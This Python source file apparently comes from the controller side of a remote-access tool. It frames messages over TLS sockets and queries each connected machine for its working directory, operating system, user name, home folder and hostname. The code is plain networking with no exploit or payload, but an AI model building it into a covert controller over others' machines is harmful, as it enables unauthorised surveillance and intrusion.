""" Client object """
import ssl
import uuid
import logging
from functools import cached_property


HEADER_LENGTH = 8


class BaseClient:
    """ Client class """

    # List of tasks running on client
    tasklist = []

    def __init__(self, conn: ssl.SSLSocket, address: tuple[str, int]):
        self.conn = conn
        self.address = address
        self.port = address[-1]
        self.identifier = uuid.uuid4()

    def fileno(self) -> int:
        """ Return file descriptior of client socket """
        return self.conn.fileno()

    def _read(self, amount: int) -> bytes:
        """ Receive raw data from peer """
        data = b''
        while len(data) < amount:
            buffer = self.conn.recv(amount)
            if not buffer:
                # Assume connection was closed
                logging.error('Assuming connection was closed: %s', str(self.address))
                raise ConnectionResetError
            data += buffer

        return data

    def read(self) -> bytes:
        """ Read messages from client """
        header = self._read(HEADER_LENGTH)
        message_length = int.from_bytes(header, 'big')
        return self._read(message_length)

    def write(self, data: bytes):
        """ Write message data to peer """
        # Create header for data
        header = len(data).to_bytes(HEADER_LENGTH, byteorder='big')
        message = header + data
        self.conn.sendall(message)


class Client(BaseClient):
    """ BaseClient with added properties """

    def cwd(self) -> str:
        """ Current working directory """
        logging.info("Getting cwd from client (%s)", self.port)

        self.write(b"CWD")
        return self.read().decode()

    @cached_property
    def system(self) -> str:
        """ platform.system() """
        logging.info("Fetching platform (%s)", self.port)

        self.write(b"SYSTEM")
        return self.read().decode()

    @cached_property
    def user(self) -> str:
        """ getpass.getuser() """
        logging.info("Fetching user (%s)", self.port)

        self.write(b'USER')
        return self.read().decode()

    @cached_property
    def home(self) -> str:
        """ os.path.expanduser("~") """
        logging.info("Fetching home (%s)", self.port)

        self.write(b'HOME')
        return self.read().decode()

    @cached_property
    def hostname(self) -> str:
        """ socket.gethostname() """
        logging.info("Fetching home (%s)", self.port)

        self.write(b'HOSTNAME')
        return self.read().decode()
